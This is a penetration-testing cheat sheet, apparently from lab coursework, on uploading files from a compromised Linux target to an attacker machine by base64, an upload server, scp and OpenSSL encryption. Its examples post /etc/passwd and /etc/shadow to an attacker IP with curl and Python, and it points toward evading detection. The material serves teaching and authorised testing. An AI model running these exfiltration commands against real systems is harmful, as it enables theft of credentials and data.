---
id: Upload
aliases: []
tags:
  - Pentest/File-Transfer/Linux/Upload
---

# Upload

Upload (*acquire*) files from the target machine
(*e.g., for password cracking, analysis, exfiltration, etc.*)

<!-- Tip {{{-->
> [!tip]
>
> The methods used for [[File Transfer/Linux/Download|Download]]
> are also available
<!-- }}} -->

```mermaid
flowchart RL
    Target-->Attacker
```

<!-- Info {{{-->
> [!info]- Resources
>
> [HackTricks](https://book.hacktricks.wiki/en/generic-hacking/exfiltration.html)
>
<!-- }}} -->

___

<!-- Base64 {{{-->
## Base64

Encode the file to [[Base64]],
in case it is not possible to transfer files
(*e.g., the remote host has firewall protection*)

1. **Target**: Run [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   on the file for reference

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

2. **Target**: [[Base64#Linux#Encode|Base64 Encode]]
   the binary file

3. **Attacker**: [[Base64#Linux#Decode|Base64 Decode]] string

4. **Attacker**: [md5sum](https://en.wikipedia.org/wiki/Md5sum) —
   Validate the hash

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Web Upload {{{-->
## Web Upload

1. **Attacker**: Install [uploadserver](https://github.com/Densaugeo/uploadserver)
   — Python's [http.server](https://docs.python.org/3/library/http.server.html)
   extended to include a file upload page

[[pipx]]

```sh
pipx install uploadserver
```

[[Virtual Environment]]

```sh
pip install uploadserver
```

2. **Attacker**: Create a Self-Signed Certificate


```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

<!-- Warning {{{-->
> [!warning]
>
> The self-signed certificate file (*`server.pem`*)
> should not be placed in an accessible location
>
> > [!tip]
> >
> > It is recommend creating a new directory
> > outside the server's served files
> > to host the file for the web server
> >
> > ```sh
> > mkdir certificate && mv server.pem certificate/
> > ```
<!-- }}} -->

3. **Attacker**: Start the web server

Create a directory for the server (*optional*)

```sh
mkdir https && cd https
```

[[pipx]]

```sh
pipx run uploadserver 443 --server-certificate ../certificate/server.pem
```

[[Virtual Environment]]

```sh
python3 -m uploadserver 443 --server-certificate ../certificate/server.pem
```

4. **Attacker**: Upload multiple files

[Python](https://www.python.org/downloads/)

```sh
python3 -c 'import requests;requests.post("<target>",files={"files":open("<file>","rb")})'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
> ```
<!-- }}} -->

[[cURL]]

```sh
curl -X POST https://<target>/upload -F 'files=@<file>' -F 'files=@<file>' --insecure
```

<!-- Info {{{-->
> [!info]-
>
> The `/upload` path is a default URL endpoint
> provided by the Python `uploadserver` package for file uploads.
>
> - `--insecure`: Trust self-signed certificate
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
> ```
<!-- }}} -->

<!-- Alternative Methods {{{-->
### Alternative Methods

Host alternative web servers on the target machine

[Python3](https://www.python.org/)
— Create a web server

```sh
python3 -m http.server
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -m http.server
> ```
> ```sh
> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
> ```
<!-- }}} -->

[Python 2.7](https://www.python.org/download/releases/2.7/)
— Create a web server

```sh
python2.7 -m SimpleHTTPServer
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python2.7 -m SimpleHTTPServer
> ```
> ```sh
> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
> ```
<!-- }}} -->

[PHP](https://www.php.net/)
— Create a web server

```sh
php -S 0.0.0.0:8000
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -S 0.0.0.0:8000
> ```
> ```sh
> [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
> ```
<!-- }}} -->

[Ruby](https://www.ruby-lang.org/en/)
— Create a web server

```sh
ruby -run -ehttpd . -p8000
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ruby -run -ehttpd . -p8000
> ```
> ```sh
> [2022-05-23 09:35:46] INFO  WEBrick 1.6.1
> [2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
> [2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
> ```
<!-- }}} -->

Download a file from the target onto the attacker machine

```sh
wget <target>:8000/<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget 192.168.49.128:8000/filetotransfer.txt
> ```
> ```sh
> --2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
> Connecting to 192.168.49.128:8000... connected.
> HTTP request sent, awaiting response... 200 OK
> Length: 0 [text/plain]
> Saving to: 'filetotransfer.txt'
>
> filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      
>
> 2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- SSH {{{-->
## SSH

The [[SSH/General|SSH]] implementation comes with an
[SCP](https://en.wikipedia.org/wiki/Secure_copy_protocol)
utility for remote file transfer

It is possible to transfer files using `scp` once

- SSH connection is established
- User credentials are known

<!-- SCP Transfer {{{-->
### SCP Transfer

Transfer a file to the remote (*attacker*) machine

```sh
scp <file> <user>@<target>:/tmp/<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> scp /etc/passwd user@10.129.86.90:/home/htb-student/
>
> user@10.129.86.90's password:
> passwd
> ```
<!-- }}} -->

> [!tip]
>
> Create a temporary user account for file transfers
> to avoid using primary credentials or keys on a remote computer

<!-- }}} -->

___
<!-- }}} -->

<!-- Encryption {{{-->
## Encryption

1. **Target**: Encrypt a file with [OpenSSL](https://www.openssl.org/)

```sh
openssl enc -aes256 -iter 100000 -pbkdf2 -in <file> -out <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
> ```
> ```sh
> enter aes-256-cbc encryption password:
> Verifying - enter aes-256-cbc encryption password:
> ```
<!-- }}} -->

2. **Attacker**: Decrypt a file

```sh
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <file> -out <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
> ```
> ```sh
> enter aes-256-cbc decryption password:
> ```
>
<!-- }}} -->

___
<!-- }}} -->

<!-- Detection Evasion {{{-->
## Detection Evasion

Bypass file upload restrictions set by administrators

<!-- Tip {{{-->
> [!tip]
>
> - [GTFOBins](https://gtfobins.org/)
>
<!-- }}} -->

Bypass blacklisted [[HTTP/General#User Agent String|User Agent Strings]]

> [!todo]

___
<!-- }}} -->
